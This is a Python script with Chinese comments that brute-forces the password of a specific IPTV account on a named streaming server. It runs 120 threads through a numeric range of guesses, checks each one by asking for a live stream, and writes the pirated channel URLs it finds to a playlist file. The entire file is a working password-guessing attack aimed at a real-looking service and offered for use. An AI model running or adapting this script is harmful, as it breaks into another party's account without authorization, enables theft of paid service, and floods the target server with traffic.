import requests
import concurrent.futures
import sys

# --- 核心配置 ---
MEMBER_ID = "97776739"  # 你的会员账号
SERVER = "iptvpro.pw:35451"
TEST_CH = "3.ts"  # 用无线新闻频道做验证

def verify_play(pwd_val):
    """核心任务：验证密码是否能跑出真实播放流量"""
    pwd_str = str(pwd_val)
    # 同时尝试 8 位和 10 位补全（参考你给的过期账号长度）
    for length in [8, 10]:
        test_pwd = pwd_str.zfill(length)
        url = f"http://{SERVER}/live/{MEMBER_ID}/{test_pwd}/{TEST_CH}"
        try:
            # stream=True 开启流式读取，验证真实数据量
            with requests.get(url, stream=True, timeout=1.5) as r:
                if r.status_code == 200:
                    # 读取前 1KB 字节，确认有流量返回
                    if next(r.iter_content(chunk_size=1024)):
                        return test_pwd
        except:
            continue
    return None

def main():
    print(f"开始暴力破解账号: {MEMBER_ID}，验证模式：真实数据流匹配")
    
    # 扫描区间：根据经验优先扫描 30000000-99999999 
    # 你可以根据需要修改 range 的起始和结束
    SCAN_RANGE = range(33330000, 99999999)

    found = None
    # 开启 120 线程，暴力全开
    with concurrent.futures.ThreadPoolExecutor(max_workers=120) as executor:
        batch_size = 5000
        for i in range(SCAN_RANGE.start, SCAN_RANGE.stop, batch_size):
            batch = range(i, min(i + batch_size, SCAN_RANGE.stop))
            futures = {executor.submit(verify_play, p): p for p in batch}
            
            for future in concurrent.futures.as_completed(futures):
                res = future.result()
                if res:
                    found = res
                    break
            if found: break
            print(f"进度：已尝试至密码 {i}")

    if found:
        print(f"!!! 破解成功 !!! 密码为: {found}")
        out = [
            "破解有效源,#genre#",
            f"无线新闻,http://{SERVER}/live/{MEMBER_ID}/{found}/3.ts",
            f"翡翠台,http://{SERVER}/live/{MEMBER_ID}/{found}/1.ts",
            f"凤凰香港,http://{SERVER}/live/{MEMBER_ID}/{found}/5.ts"
        ]
        with open("config_v2.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(out))
    else:
        print("未发现匹配密码，请调整扫描区间。")

if __name__ == "__main__":
    main()
